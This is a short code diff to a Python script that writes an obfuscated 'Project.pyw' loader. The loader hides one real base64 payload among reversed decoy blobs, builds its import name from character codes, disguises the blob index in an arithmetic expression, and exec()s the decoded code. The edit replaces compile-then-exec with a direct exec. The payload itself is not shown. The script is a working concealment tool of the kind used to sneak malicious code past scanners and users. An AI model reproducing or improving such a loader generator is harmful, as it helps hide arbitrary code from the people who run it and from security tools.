@@ -23,14 +23,14 @@ for i in range(4):
     enc = base64.b64encode(junk.encode("utf-8")).decode("utf-8")
     blobs.append(enc[::-1])
 
-# --- Insert real blob ---
+# --- Insert real blob at random index ---
 insert_index = random.randint(0, len(blobs))
 blobs.insert(insert_index, real_blob)
 
-# --- Safe index obfuscation (always valid) ---
+# --- Safe obfuscation expression (always evaluates to insert_index) ---
 expr = f"({insert_index}*10)//10"
 
-# --- Build wrapper ---
+# --- Build wrapper (no compile, just exec) ---
 wrapper = f'''
 import importlib
 p1=chr(98)+chr(97)+chr(115)+chr(101)
@@ -43,11 +43,11 @@ blobs={blobs!r}
 idx={expr}
 data=blobs[idx]
 code=d(data[::-1]).decode("utf-8")
-exec(compile(code,"<x>", "exec"))
+exec(code)
 '''
 
 # --- Write obfuscated Project.pyw ---
 with open("Project.pyw", "w", encoding="utf-8") as f:
     f.write(wrapper.strip())
 
-print("✅ Obfuscated Project.pyw created successfully")
+print("✅ Obfuscated Project.pyw created successfully (no compile)")
